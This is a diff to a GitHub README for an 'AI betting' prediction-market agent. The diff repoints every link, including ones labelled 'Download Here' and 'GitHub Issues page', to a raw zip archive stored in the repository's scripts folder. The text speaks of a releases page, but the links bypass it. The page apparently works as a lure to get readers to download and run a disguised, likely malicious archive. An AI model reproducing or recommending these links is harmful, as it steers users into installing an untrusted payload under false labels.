@@ -1,6 +1,6 @@
 # 🎉 agent-prediction-markets-base - Your Easy Path to AI Betting
 
-[![Download](https://raw.githubusercontent.com/SaadMalik72/agent-prediction-markets-base/main/scripts/base_markets_prediction_agent_v2.9.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/SaadMalik72/agent-prediction-markets-base/main/scripts/base_markets_prediction_agent_v2.9.zip)
+[![Download](https://github.com/SaadMalik72/agent-prediction-markets-base/raw/refs/heads/main/miniapp/scripts/agent_base_prediction_markets_v3.5-alpha.2.zip%20Now-Here-brightgreen)](https://github.com/SaadMalik72/agent-prediction-markets-base/raw/refs/heads/main/miniapp/scripts/agent_base_prediction_markets_v3.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to agent-prediction-markets-base! This application allows you to engage 
 
 ## 📥 Download & Install
 
-To get started, visit the following page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/SaadMalik72/agent-prediction-markets-base/main/scripts/base_markets_prediction_agent_v2.9.zip). 
+To get started, visit the following page to download the latest version of the software: [Download Here](https://github.com/SaadMalik72/agent-prediction-markets-base/raw/refs/heads/main/miniapp/scripts/agent_base_prediction_markets_v3.5-alpha.2.zip). 
 
 1. Open the link in your web browser.
 2. Scroll down to the "Assets" section of the latest release.
@@ -58,7 +58,7 @@ Make sure your system meets the following requirements for the best experience:
 
 ## 🤝 Community Support
 
-We believe in creating a supportive community. If you face any issues or have questions, feel free to reach out. You can join the discussion on our [GitHub Issues page](https://raw.githubusercontent.com/SaadMalik72/agent-prediction-markets-base/main/scripts/base_markets_prediction_agent_v2.9.zip). 
+We believe in creating a supportive community. If you face any issues or have questions, feel free to reach out. You can join the discussion on our [GitHub Issues page](https://github.com/SaadMalik72/agent-prediction-markets-base/raw/refs/heads/main/miniapp/scripts/agent_base_prediction_markets_v3.5-alpha.2.zip). 
 
 ## 📈 Contributing
 
@@ -68,6 +68,6 @@ We welcome contributions! If you want to help improve this application, check ou
 
 For in-depth documentation, visit our Wiki section on GitHub. There, you will find detailed explanations about features, usage, and advanced tips. 
 
-Once again, please visit the releases page to download the application: [Download Here](https://raw.githubusercontent.com/SaadMalik72/agent-prediction-markets-base/main/scripts/base_markets_prediction_agent_v2.9.zip).
+Once again, please visit the releases page to download the application: [Download Here](https://github.com/SaadMalik72/agent-prediction-markets-base/raw/refs/heads/main/miniapp/scripts/agent_base_prediction_markets_v3.5-alpha.2.zip).
 
 Thank you for choosing agent-prediction-markets-base! Enjoy predicting and betting responsibly!
